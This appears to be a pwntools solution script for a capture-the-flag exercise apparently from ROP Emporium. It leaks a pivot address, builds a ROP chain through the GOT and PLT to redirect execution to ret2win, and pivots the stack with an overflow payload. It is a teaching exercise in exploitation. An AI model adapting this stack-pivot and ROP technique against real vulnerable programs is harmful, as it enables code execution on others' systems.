from pwn import *

exe = ELF("./pivot", checksec=False)
p = process(exe.path)
libpivot = ELF("./libpivot.so", checksec=False) 

p.recvuntil(b"pivot: ")
pivot = int(p.recvline().strip(), 16)
print(f"Pivot address: {hex(pivot)}")

# gadgets
pop_rdi = 0x400a33      #0x0000000000400a33: pop rdi; ret; 
pop_rax = 0x4009bb      #0x00000000004009bb: pop rax; ret; 
call_rax = 0x4006b0     #0x00000000004006b0: call rax; 
load_rax = 0x4009c0     #x00000000004009c0: mov rax, qword ptr [rax]; ret; 
pop_rbp = 0x4007c8      #0x00000000004007c8: pop rbp; ret; 
add_rax_rbp = 0x4009c4  #0x00000000004009c4: add rax, rbp; ret; 
xchg_rax_rsp = 0x4009bd #0x00000000004009bd: xchg rsp, rax; ret; 

offset = libpivot.symbols['ret2win'] - libpivot.symbols['foothold_function']
print(f"Offset: {hex(offset)}")

payload = p64(exe.plt["foothold_function"])
payload += p64(pop_rax)
payload += p64(exe.got["foothold_function"])    #rax = &foothold_function
payload += p64(load_rax)    #rax = [rax]
payload += p64(pop_rbp)
payload += p64(offset) 
payload += p64(add_rax_rbp)
payload += p64(call_rax)

p.sendlineafter(b"> ", payload)

pivoting_payload = b'A' * 40
pivoting_payload += p64(pop_rax)
pivoting_payload += p64(pivot)
pivoting_payload += p64(xchg_rax_rsp)

p.sendlineafter(b"> ", pivoting_payload)

output = p.recvall().decode(errors="ignore")
print(output)